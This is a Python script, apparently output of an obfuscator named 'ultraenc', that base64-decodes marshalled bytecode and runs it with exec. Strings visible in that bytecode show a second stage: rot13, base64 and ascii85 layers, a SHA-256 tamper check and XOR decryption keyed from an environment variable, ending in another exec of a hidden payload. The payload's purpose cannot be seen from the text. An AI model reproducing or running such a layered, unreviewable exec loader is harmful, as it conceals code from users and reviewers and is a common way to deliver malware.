#!/usr/bin/env python3
# ultraenc final wrapper â€” keeps internals hidden
import base64, marshal

DATA = """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DAEIAXIDAAAAYeAjAABuS1dQV3ljNnJhYnVWR1pnVmxSYU0wMXVWRjA0S1I4dVZGRUNaUTFpTFBmM0RIdDNDek51Q1E5TFp3Z25Gd01YRXpnZ0xRWnVWdnBhRkhEaUxISDJFd2tVR1JaeEN4TC9weEV6SVVTUEVKVmpBd0lPSVIxbUFsRDBCUFZ3QUtJSVlIVjRGMTQ4Q3hMNlhIcTBEVVN6SlRTTkNQMVZBUUVLbjNPZ1gzT2lCVDRtRElPVEpGZjhLSWZqR1VJQ0sxTWNNbEFlbklTT0V4OXhHVUlDSzFNY01sQWNIRmY4S0lmakdVSUNLMU1jTWxBZW5JU09FeDl4R1VJQ0sxTWNNbGtSSjFTT0V4OXhHVUlDSzFNY01sQWVuSVNPRXg5eEdVSUNLMU1jTWxrUkoxU09FeDl4R1VJQ0sxTWNNbGtSSjFSYUkxcUVISFNURzJFWnFIOXNJenlhWVJFb0hIU1RHMkFFSElXVFpJU09FeDl4R1VJQ0sxTWNNbGtSSjFTT0V4OXhHVUlDS1REZUhIU3FEMnlhWVJFb0hIU1RHMkVacUg5c0l6eWFZUkVvSEZxS0lHeWNNbGtSSjFTT0V4OXhHVUlDSzFNY01sa1JKMVJhSTFxRUhIU1RHMkVacUg5c0l6eWFWMnlFWG1rcUptT1pxSDlzSXp5YVlSRW9IRnFLSUd4ZUNTTHhHeVNPRXg5eEdVSUNLUzVjTWxrUkoxU09FeDl4R1VJQ0sxTWNNbEFjSEZnRURJMVFuSnBmRVNnRVdsdGFvUmsxRzE5Sm5KcHdMek1FV2FEdW54OUVYSDl5bkpwd0l6V0VYUTlqVnlXd0JJRWluSnB3SXpXRURITUNNUmsxRzFrdW5KcHdJeldFV2FEdW55QXRBS1dlbkpwZkVTZ0VXMFo1b3g5RVhIOXluSnBmRVNnRURITUNMMVN6Q0dreW5KcGZFU2dFVzBaNW94OUVYSDl5bkpwd0l6V0VXYUR1bnlBWUhLT0xHVUlDSzFNY01sQXZNeVJ6cVBTZEcxUmNIeTVjTWxrUkoxUmFLeGdsR1VJQ0sxTWNNbEF2TXlSenFQU2RHMVJjSHk1Y01sa1JKMVJhS3hnbEdVSUNLMU1jTWxrUkoxU09FeDl3SElTTUJ5V1pxSDlzSXp5YVlSRW9ISFNURzJBQ0kxeXZuUGY2RFBnaUdVSUNLMU1jTWxBTUwxU09FeDl4R1VJQ0tUU2NNbGtSSjFTT0V4OXdISVNNQnlXWnFIOXNJenlhVjF5d0hIU1RHMkVacUg5c0l6eWFZUkVvSEhTVEcyRVpxSDlzSXp5YVYyeUVYbWtxSm1PWnFIOXNJenlhVjFxWVhta3FKbU9acUg5c0l6eWFZUkVvSEhTVEcyRVpxSDlzSXp5YVlSRW9IRnBiVzJrWnFIOXNJenlhVjFxWVgxU09LSEFjTWxrUkoxU09FeDl3SEpMOUNUSWNNbGtSSjFTT0V4OXhHVUlDSzFNY01sa1JKMVJhRG15aEgyTjFwemdjTWxrUkoxU09FeDl4R1VJQ0sxTWNNbGtSSjFTT0V4OXdHMmtSSjE5Y01sa1JKMVJhRG15aUdVSUNLMU1jTWxrUkoxU09FeDl3SFR5T1ZKV2NNbGtSSjFSYVZHUm1YbWtKV1I1RURITUNNUmsxRzFrcm5KcGZFU2dFREhNQ0wwOWZFU3VqbkpwZkVTZ0VESE1DTDFTekNHa3luSnBmRVNnRVdsdGFuMVd3QklFaW5KcHdJeldFV2FEdW54OUVYSVdybkpwZkVTZ0VXbFJrWmxnRURJMVFuSnBmRVNnRVdsUmtabGdFREkxUW5KcGZFU2dFVzBaNW94OUVYSDl5bkpwZkVTZ0VESE1DTDA5ZkVTZ3NuSnBmRVNnRVdsUmtabGdFREkxUW5KcGZFU2dFV2x0YW9SazFHMTlKbkpwd0x6TUVXYUR1bng5RVhJV3JuSnBmRVNnRVcxNVlweGsxRzE5Sm5KcHdMek1FV2FEdW54OUVYSVdybkpwZkVTZ0VXbHRhb1JrMUcxOUpuSnB3SkpBRVhQRXFxSGsxRzE5Sm5KcHdMek1FWFE5alYwazFHMTlKbkpwd0kwZmVDU014QXp5YVlSRW9ISFNURzJBQ29SRW9LMnlhWVJFb0hGcHVaMGdFWFBFcXFIazFHMTlKbkpwZkVTZ0VESE1DTDA5ZkVTZ3NuSnBmRVNnRURITUNNUmsxRzE5Sm5KcGZFU2dFREhNQ0wwOUtKSldibkpwZkVTZ0VESE1DTDA5S0pKV2JuSnBmRVNnRURITUNMMDlLSkpIZUhIU1RHMkVacUg5cEt6eWFWM0VmSEhTVEcyRVpxSDlzSXp5YVlSRW9ISFNURzJFWnFIOXBMSnlhV1B1aUhIU1RHMkVacUg5cEt2ZjhLSWZqR1VJQ0sxTWNNbEFNTDFTT0V4OXhHVUlDS1M0ZUNTMW9aUmsxRzE5Sm5KcHdKSkFFREhNQ01SazFHMWtyWDFTT0p5RWNNbEFKTHlSYkJGTUtISFNURzJFWnFIOXBLdmY4SXpFWldSZ05DdzVjTWxBSkx5UmJDM052SHpaNUlUOWNNbER6SWxnRURJY0huSnB3SXpXRVdhRHVueDlFWEg5bG5KcHdxVGtFV2FEdW54OUVYSDl5bkpwd0l6V0VXYUR1bng5RVhIOWxYbWtKTXpFRVhQRXFxUjlFWEg5bFhta0pNekVFWFBFcXFSOUVYSDlsWG1rcUpsOUZMbXlIbzJ5YVdQTUtuSnB3cVRrRVdhRHVueDlFWEg5eW5KcHdJeldFV2FEdW55QVlIS09LSHpaNUlUOWNNbER6SWxnRURJY0huSnB3SXpXRVhROWpWeVd3QklFaW5KcHhXeXBlSEhTbklUeWFWMU12SEZ0L3BQV0ZMbXlIbzJ5YVdQTUtYbWtKTVJrY01sQTBvU1J6cVBTZEgwZ1lXVURlQ1BnQkNIRHhuUnhsWDNPaEphV1NMeUVTQUYxMFl3UmZEemdycFM5U0wyT3RCbEQ5b0k1b1gwRDFCUDAvSnkxZHBIU0dBdkVmRVAxa0V2eU9BbXlGbjBMdXFGMVlEMGtrRHdwZUQyTGJveE1RWTJPZ1l3TDNNSXhlQ1NNeUdSSXZvVGNxWDBEY01tV1RFSEVYRG1BcEd2MWpFRmdqcEh1T0gyV2pueEl1TFRMN0VUTUhGeEVOSWwxTkJSTVJuM1ZlRVJrVFpSNU9JU0lqbjBSM0JJV2VFdlI2cHdMZUNTTXlGSFNIR0pwaUVSZ1BER1owSTI1d0l4SVZIVHgyRXhINVcweU9JU0QrRDBJdm9HTm1YbWtKTVJrUG4wU1lZeFNIR0pwaUVSZ1BESFNUWHZ1Y0FSTXRJSjh2RVRIZEVGSDBKYUFpRG1PWEUwNWpYbWtKTVJqZUNTTXhHUk10QnpqdkV4QXpHR3gwSTI1d0l4TGNKdkw0RXZ1VnFRMVRYSU9rRUY0a1l3Ui9YbWtKTVJqZUNTeUJBUkxjcVRaekRJRVhxU3BlRGFWZUpGZjhJekVaWG1rSk1Sa09vMEVxQVJJdlpRajNEMnlhTUdNUkR4OGJEUlIzQklXZUV2cVBuRjlPSVI0dVpITDhKRlNDV1FNSUZRTGVDU014R1BmOEl6RVpYMEVVRXdSZld4a2hBUkxiV3kxZ1gzWjZJUWZlRUhEeUEwTXNvUDVQRFFncUlVSVNMd044QTBBY25KamRFUDVGTVFPTkJhWmdwRzh1REhrc0R4OUVWRmovVkhTWk1IUmpIUWZ5QVNjbW8zRVBHMVJ1bkhXZVpRcG1YbWtKTVJqZUNTTXhHUGY4SXpFWlhta0pNUmtSWXlXeFpSTjZwbDVnWTI0ekt3a09IM0h4WVJJdlpRajNEMnljb1BjUll5V3haUk42cGwxa0NsU09HVU9PSUZMN0RRNWtXUGZhWG1rSk1SamVDU015RkhTSElscDRFUldCTUYxVFhLRXdXeFNIRndWeFhta0pNR2tRbkpSaUZsRDJJSHQyWG1rSk1SamVFR1dOQlJFWUZHeUJYSkQrQ1N1Ulh6dWxJbGdSQ3dWZERRQVBGbHlUbkhXMHBSTUtMeDA4S0dMeUpVV1JEeDh5QVJBQkNUYmJYMEFpV3ZFT0YyTnVwbU9EcHZTc1dRTUlGUUxlQ1NNeEdQZ1NFUEg0RXpPQURSVitDM1NGRDBSM0tHOWtFdnVZQXZWL0pLQU5wSExiV3kxZ0MxY3JaMjVURDJMNVZ4VjJXSEkwWXZSakR4QU9IM1p5REhPa0tHY2dDMXlDV0ZIZUVJTGtDeEw5RHdNTFhta0pNUmtUTFIwNkRRRUtvdzVwRHlTR0NtdVRWMmdtWUhON28zTjFFeEF6QkZXUEF2SVNxUDlpSFRBUVpRRVhueFNWSnl0a0RIU0dxSjlaRXZ1WUF2VjVuMFNQTUhONnBsMWtXUU1JRlFMZUQyNWlXeE5tRFMxSUZTU2ZwbUlOQ1E1ZG54UmpHbE1LRFVTcUJ6MC9KSDh5V0ZmOG4yODlFMTFNWVRiZUVJTGtDeE1UQ0hmOVhta0pNSHlPSVIxYVkwRVlEeFJtQVNxaEwxTVNGU09jQXhNU0JGcUZFVE1yVnhnVExSMDZHUGdRb3o4ekRRTVhZd09URG05SVh2ZjhJekVaRHpnT0ZsNU9JUjFhWTBFWUR4U09FdmJibkdFVExTSWlWeEV5WHhIeUFTY21vMFpqRnhxQnBQZjhJekVaWG1rSk1Sa1NZVDluWkhMOUJRMURDd2plRlNJdEdTNXhJSEl2WUhSekRSSHZueHlTb1E0MVl4QWFNSHhiSXo4ZnB6dXNvd3l5cHk5aEFhT2daU09sVkk4eEF5SVZBdmdSVjBSa0RINVFZME5lQ1NNeEdQZjhJeklVRUpXSEVHSGdvSFdJQW1BT0UwV2NIMjVKTUlxT0Yxa2dNMTlnSlQwaUtJT0FZYVdPSHo5WllGeXhDdlYxWDNEbW52Z09BMTAvcEhMYkZtTHZDMXVvTHpIL0pHRHZNMFNIR0dBZ0VSeDNDM1dSTXdOZkFsNDJBMklNWG1rSk1IZ1JNSnlqV0ZmL0t6dWVDUHRqRnhqM28wRUtGRmdOQlRmYVgwVmxZR04zQlJBeVh2Z05ueFNHQjFEZk1HcGVwVDlVQlBmOEpHTmdEUWorbnpjT1pRMHdKUGp2VnoxeUNQRDVZVE4yb0ZqdkNTeU1weElSQnZjWlYxTmVDU014R1JIZm8xYmtFdzA0Q0lOK0NQZ1ZJR2d5Q1RnU0RJQTFXM09RblFxS0Z2RDRFdjVJQlNEeklUZ05CYUFJblJEeG5GRUJYMDR6cUlTblZhUjZLMk9aTUZ5RlpTT2xWSTh4QXlJVkF2Z1NLMlI2RUpTQkNUeVJNSXFxb0ZmL0t6eXFFUmZhTFE4Z29IV0lBbUFPSFJxQURJMGJFSWdSWWxTZ1dIdDVYdjl6Q3dmam93amhaRjFSWEZmOEl6SU5ESk0xQUdnT0lSRGdNeFdFV0lFakRIZ0xZRlJlQ1R5QkxHQUxIS0lEWG1rSk1SamVDU3lQQkhMZFhUeGFFSlN0TXprVExTTGZBMEVXRkhXaFhtOXJuSTFSRmxxdENsMWdEeUgzWjBTREUwTXNvd2JjVzBTR3B5cGVFeTllb1BNUklQTXluSk5tRDBNaERIU2VLM1NQQUZ5UVYwRVNCVDFuQ3dmam93amhaRjRrQ2xmOEl6RVpYbWtNSTBFUG9RdHdEUlNhWlRrZEQyeHVHYUV0WjBJYW55eWlvSHl3TFFBUkMwcVZKSHlPQ0hNUURKcHpEUWdIRFQ5VFhSZ1BaUk43SVNaYlkycGNYd2ZtRElPVUV5OWhCdnhhRElBbEltQU5CeHhqSjBJdnB5anVYMEhjWFExUkQyQWpHU0QwcEo1TERIZ01HS09SRkoxclZ4dHdGSTVJWTJ1R1hIeGpIVVZ1S2xEMklIdDJYMER3REZxT01hSDFCMFNIRVAxekR5UnlJVU9PRjF0Z1ZGZjhuSVN2WjF1RXFJTmVDU014R1BmOEpJcVJEemo0VjBOZXB6U3RGUVJsSlVPdUxRQVRYYVduWVI0OUpSdHVxU2ZrSnZaeURUT1ZWMHlySUY5YkhseVdaU09sVkk4eEF5SVZBdmY4SXpFWlgwSVJXR3VUTFIxTllQZjhJekVaRElBd0V2Um1KU1MxSFBmOEl6RVpYbWtNSTBFUG9RdHdEUGdsTEpPVlpUajVFSmtzb1BIYU1STGJvM1NRRXZ1QkEySU9IM0hhcFA4akZ6QVZLSVNOTEtBUkR4OHlBUkFCQ1RiYlgwQWlXdkVPSUY4dVlGOXpIbFdZRVBxUUVReGVDU014R1BmOEl6RVpFSlZqQ211U0xseG1ubGY4SXpFWkVQNUZNUU9OQmFaaG9GZi9LenlvRElFSkJ2RU9IMldqbnhJdUxUTWZFek42b1BXVEQyTUFESE1SbjNWZUVSQXdvbTlQRzFSdW5IV2VZMXh2WG1rSk1Sa09vMEVxQVJEaEh6RGpEUWNtWUo5UG9RSHpaSFNIR0tOeER3RW5ZSEx4QXlJVkF2ZjhJekVaWDBIbERRdVJGMHg2Q0ZnbExKT1ZaR1dITFVBVFhLRXdXeFNCRDNXcEVQNUZNUU9OQmFaaVZ2eXhDdlYxWDNEbW52ZmVDU014R1JIZW53TmdESVdQR0ZBUk15RDVWSFNGRHhBdkV4RGZLbWowSTIxbEJGZjhJekVaWG1rSk1SamVxVDR2SnhFeklReHVESDAzSXdBVEsyZ1lZeFNGb0hxWFgzRUNXMERlQ1NNeEdQZjhJekVCWlFJTUlSZmpBd2NuQXhOOFlUMHpZbDRkR1JWZUNTTXhHUGY4SXpjcUV2dU9MMnVTTHZFTkV2RDJJSHQyWG1rSk1SamVDVHlXSjBNUm9RVmhEd0VLTFAxVUtJY2VwUU1MTHZXVVgzRUNXMERlQ1NNeEdQZjhJekVCWlFMN0FJV1NMSk9Ib1FOMkJ5YjJEUWpmb0dIZXFSOGFFUGY4SXpFWlhta0pNUjRqQUl5SEZtTjBNeFdBQjJIaUFsdVNMdkVORXZEMklIdDJYbWtKTVJqZUNUeVdJSEVZRkg5UUUxMW9HR2dSRkh4L00wTGJDMHlVV1FNSUZRTGVDU014R1BmOG5IeVpEUWorcFFXT0FteUZNbU5tTFJaYkRVVndHVEFPSHhWOUxSRGhIdlJlREo1d1cyMVRWR2poRHZmOEl6RVpYbWtKTVJqZXFUMVhCUk1RQzJ1VEV2dVlESExqRnc5TEdSTjZHbHVxRHdFTUV6TU5CMUVGS0dOMG9hTjNESUVZV0h0eEF5SVZBdmY4SXpFWlhta2NGSGtOQ1E1alp4TXRJdmozQzF4dUtsRGpGdzlMR1JONkdsdXFEd0VNRXpNTkIxRUZLR04wb2FOM0RJRVlXSHR4QXlJVkF2ZjhJekVaWG1rY0ZJZ1RFVGpsWXhWMEkyTmdFUU41SnZxVEQySTFCR09YQ3p0MEUwU3NBR3VOQnlJRUFGRDJJSHQyWG1rSk1SamVDVHlXSUhFWUZIOUVER3FZV0pxT1pLTituUnFPS21INERRY0lIR0h4QXlJVkF2ZjhJekVaWG1rY0ZJZ09BMGZ5TTBSa3BRNWJFMFNzQUd1TkJ5SUVBRkQySUh0Mlhta0pNUmplQ1R5V0owTVJvUVZoRHdFS0xQMVJaUXluVzBNUU1LSDVaUmIrTTEwNEhSa1BKbEQySUh0Mlhta0pNUmplQ1R5V0owTVJvUVZoRHdFS0xQMVJaUXluVzBNUU1LSDVaUmIvQW1jTnBhSWRBeFNIRmxJVldRTUlGUUxlQ1NNeEdQZjhuSHlvRXhFZlp2NVBBU3F0WUhEakJJYmFFeEF5cUd4akZ3OGhDSHB5bjA0aVgzRUNXMERlQ1NNeEdQZjhJekVCWlFMN0FJV1NMSk9Ib1FOME12U1FEMnFiRUtBT1pKOUpuR3lnWFIxZURUYm1GUVZlQ1NNeEdQZjhJekVaWDNFaFZ5Y1JNeUQ1VkhTQUExTG1FeTllRmw1T0h6MVVGd05rQkk5YUV5OTBLRjFURUd1S0FGZjhJekVaQ3oxcm8xMGVDU015RnhTR3FJRW1ESjV3VzIxVFZGY0lNMExiRjBxT1l3UmdFUHhlQ1NNeUNIRXpIS0QrRFFqL1pQY1BvUUh6QVJXRVdKRHZDMWNJQ0YxU0xKT0hvUTluQkhNa0R5U1ZaMFJlQ1NNeEdQZjhJekVaREo5UktHRVNMbUlmQ1A4akZ4YjdFSkFLTDFBT296WmFvSEx1WVFSM1gwSGNDU1dVRFE0OFdsMTFMU0g2RHh5RHFSamVDU014R1BmOEl6RVpYbWtKTVJrT28wRXFBUlNoTGxxZ0VSeVdEejRlRVJxckJIU2hMbHFnRXZBZEpSNGVDU014R1BmOEl6RVpYbWtKTVJqZUNTTXlDSFdmV0c5ekVGZmRudkhlQzE1Y0wwTHZJeEgvRXhEZEJ4U1JNSXRjQjBJd0FKajhZbU9YSFExUW5RcVlvSERoSFA0YVhta0pNUmplQ1NNeEdQZjhJekVaWG1rSk1SanhBeUlWQXZmOEl6RVpYbWtKTVJqZUNTTXhHUGdSRTBMa0RKNXdXMjAvSnd5VHBIV1ZJdlpmWDBJQVhtQVREbDlLbzBBYkExY1lXUU1JRlFMZUNTTXhHUGY4SXpFWlhta0pNUmplQ1NNeEdQZ1FNdzRnRXhEMUltdU9GR3lEV3ZmOEl6RVpYbWtKTVJqZUNTTXhHUGY4SXZWMlhta0pNUmplQ1NNeEdQZjhJekVaWG1rSk1HMVBvUEgvTXhFV0ZIV2hYbTlybkpBVFZ5TVNDME1SWHdiNURRajJWS0VOQjFFRlhSU2hMbHFnQzFiNUVhU1BGSDg1WnZmOEl6RVpYbWtKTVJqZUNTTXhHUGY4SXpIOUR6anlDMk1PSUZMN0N3RUtveWN1WTI5TUF4T1BGdmdORXhBYktQUnpFMTFNQzBxUG9QSC9NeEVXRkhXaFl3eXlHd0Rpb21JVkdIU0hEd1NYV1FEM29LSGVDU014R1BmOEl6RVpYbWtKTVJqZUNTeVBaRmdSWVE0YkRJV1BWejVUQ1JwNkJQZjlGeEl4RG1XeE13TmlaUnRmblJabE1UT21YM0VDbklqaW8xeXFEUGcwQUlPb1hta0pNUmplQ1NNeEdQZjhJekVaWG1rSk1SamVDU014R1JTaExscWdFdlJkSUpxVkhKMVNEeEV6TXo1T1oxY2xDMWdPSDNXaVl4V2ZXRzl6RUZmZG52SGlaUnRnSTBPQm9HcVpXUU1JRlFMZUNTTXhHUGY4SXpFWlhta0pNUmplQ1NNeEdQZ1JWMHB4RUZrSEZQNVRDUklyblBqYVl3MDFER0lWcHl1VEVUeC9aRmY4SXpFWlhta0pNUmplQ1NNeEdQZjhJekVaRElBd1cyMGVFUGorWFJTRkR2V2hFd2tVQnd0ZUNIY1NNUkRpS21rSVltT1ZZVHVOQ1NSL1lsOGpGUGtiRVA5TEgwUmhBd3F5SkZmOEl6RVpYbWtKTVJqZUNTTXhHUGY4SXpFWlhta0pNRzFQb1BJTldGZi9LenlpWVBxV0ptV09JUE12SHZnU1hHRGtFUkFQWG1XUW5RTW1vSE44Q21OMlhta2VuR3RlcVFxakZGZjhJekVaWG1rSk1SamVDU014R1BmOEl6RVpYbWtKTVJrT0gzSHhxUkV5SlBibFhtOXJuVGdUWFJmMlZ3a3ZKdnlJRVM0d0d3VmVDU014R1BmOEl6RVpYbWtKTVJqZUNTTXlDUkFjTEY5WVdRTUlGUUxlQ1NNeEdQZjhJekVaWG1rSk1SamVDU014R1BnU1p4TjRFUmdXQkg0Y01RNDhKUkRlcEpiN0ExV3pNMFJlRHZ1RW9HdUVXd0lGWDBTTUptVjZYeE9CRkpObUIxNGlBbUFUcUpINll3cWpweXluSlRWdlkydUdMdjhjTVE0dkFGZzBaMmNPWG1rSk1SamVDU014R1BmOEl6RVpYbWtKTVJqZUNTTXlCeEV6WlNibEVSZ0hHVUR4QXlJVkF2ZjhJekVaWG1rSk1SamVDU014R1BnU0l5dVpaMXVFcUlOZUNTTXhHUGY4SXpFWlhta0pNUmplQ1NNeEdQZjhKSTA1RXZ5bld3dVRYUnVXSWxnU0VQSDFFeThmSW15VFZ5TVNHSExkV3pxUFlQSTFYUTlTWUZWem93TjBESnAyWTNOYkp4T09IbUx4b1JEYktKU1dEdjVnS21FVEV2OGVGeEFacEhabVpRcGhCUmNPQlRrV1dSRVlHUWNCWW1PWEZ3QVREME45SnZqeUVtY2pFeFppTFQwZlZGRWNJeFdDSEZTY0R6ZmxJMFplRVBqK1hSU0hHUFdWRHpqeURQSGhaRjRrQ2xmOEl6RVpYbWtKTVJqZUNTTXhHUGY4SXpFWlhta01LR3lUWEliekJSTGJGVUVTRFFmak1UOC9KR0QwcG05bklHazBFeElBSlNSaFpGNGtDbGY4SXpFWlhta0pNUmplQ1NNeEdQZjhJekVaWG1rSlZ3TGVDU014R1BmOEl6RVpYbWtKTVJqZUNTTXhHUGY4SXpJTkRKTTFZUGNUWEliekJSTGJGVUQ5RXZ5RHBISGhBRlozRUhMOUJRNUNEMEl2WnpweEF5SVZBdmY4SXpFWlhta0pNUmplQ1NNeEdQZjhJekVaWG1rSk1SamVFR1dOQlJFWUZHeUJYSkQrQ1N1UkJUeGNLUlNpSzB4dURJRU9vbHVPSDNIYXAwV2dFeXA3WDBFd1pIV09vdzVkV3hPSldtMWVESUhpVkYwZUkwTUtDeERhRDBENVhta0pNUmplQ1NNeEdQZjhJekVaWG1rSk1SamVDU014R1BmOEl6RVpFdnVZQXdWL0pHRHZNMFNIRjBiMERHcUZYdkFQb1BIL014SGVYemJ5WXdSaFpHOGVDU014R1BmOEl6RVpYbWtKTVJqZUNTTXhHUGY4SkdMbUV2dVdEdzRlQ1NNeEdQZjhJekVaWG1rSk1SamVDU014R1BmOEl6RVpYbWtKTVJrU1lUOW5aSEw5QlExREN3amVGU0g1SnZjUFZ3cUZLdk1qTFFBTkFTTjVHU01NcUdNVldQYmdCSnFrRlEwNlh4T1ZaUXVEQjJBUkNJamxEUVY5S1R1b25RSWpZMTF5QjJTVEFJVjFxSGo1R1BnQkJLU2RKSXVKR0liN28wcWdLbXhrTFBBRUJIamxEdzA5cG1IdllHNDdaVDQ4WXdSaFpHOGVDU014R1BmOEl6RVpYbWtKTVJqZUNTeDJDME9rRHlMeFgwSVJXR0lUS2xrS0JITHZJdkVZRFVTUEl2RVBvUk9nWkY5ZkZRdHdFeThmSW14M0NUeDhIeEhnWVRMMEVSV0JERjhlRVBTR0RQZjhJekVaWG1rSk1SamVDU014R1BmOEl6RVpYbWtKTVJrU1lUOW5aSEw5QlExREN3amVGU0g0QVE5VkRtY3RwdnhjQkg0OW5TSDhDMXA3TG1PRHB2U3NXUU1JRlFMZUNTTXhHUGY4SXpFWlhta0pNUmplRVBqK1h4TjdGMlZkWjF1RXFJTmVDU014R1BmOEl6RVpYbWtKTVJqZUNTTXhHUGY4Skd4M0VJY3lxUDVRblFFdFcwRVBHeU5kRDJ0M0p3OVVXRlptWlJTSEZtcVlaMXVFcUlOZUNTTXhHUGY4SXpFWlhta0pNUmplQ1NNeEdQZjhJekVaWG1rTUJHU1FuUUgxWTBBY0NIVmVZSjRmRm1SZUNTTXhHUkhmbzFia0V3MDRDSU4rQ1BnVklHdDBDMHVRQnpPbFhGeDVHdzFiSUdqL0lRdURMUVo3S3Y4M0F3V09vUU9EcHZTc1dRRDZuSkFSRkpEZEswQWNWSHVkRHpqeURQSC9KSDlRTHhIZW53TmdESGtYcUdweEFReUJJbFNob0ljTk1scGNFbXlQb1F0eG9QUmdZbDlPVkZSeVdSUnVWRlJ3cEZENUkwdVdFeEhrTXZFUkZJeWZMRkFLcUtBUERHeVJLdlYwbzJnS0xQUmdCUXVRVkZSdVl4OHVWRmdpTDBONkVKdHpaSnVaQXZrT0h6MXZLUVp6THc0Z1pUTXNBeUFPR3dXQVdRT1laSWYrWkhxYU0wVmxFU0FmWEdBUEJUOUVER1dFWWxFT1phSUFZSFIzSHlSaERIMC9XS0RqRzJBbXFHT3lwdD092gVwbGFpbtoAKQFyJwAAACkWWgljeV9sb2FkZXJyAgAAAHIDAAAA2glFeGNlcHRpb25yDAAAAHIFAAAAchMAAAByNAAAAHIKAAAAchAAAAByEgAAAHIWAAAA2gNzdHJyIQAAAHIcAAAAciYAAABaB1BBWUxPQURaBE1PREVaCFNBTFRfSEVYWgdLRVlfRU5W2gRjb2Rl2gRleGVjcggAAAByCAAAAHIIAAAAcgkAAADaCDxtb2R1bGU+AwAAAHMiAAAAAgEUAQwBJgIIAwgDCAMIAxIDEgcYDA4IBAEEAQQBBAISAQ=="""

try:
    blob = base64.b64decode(DATA)
    code = marshal.loads(blob)
    exec(code)
except Exception as e:
    print("Hata:", e)
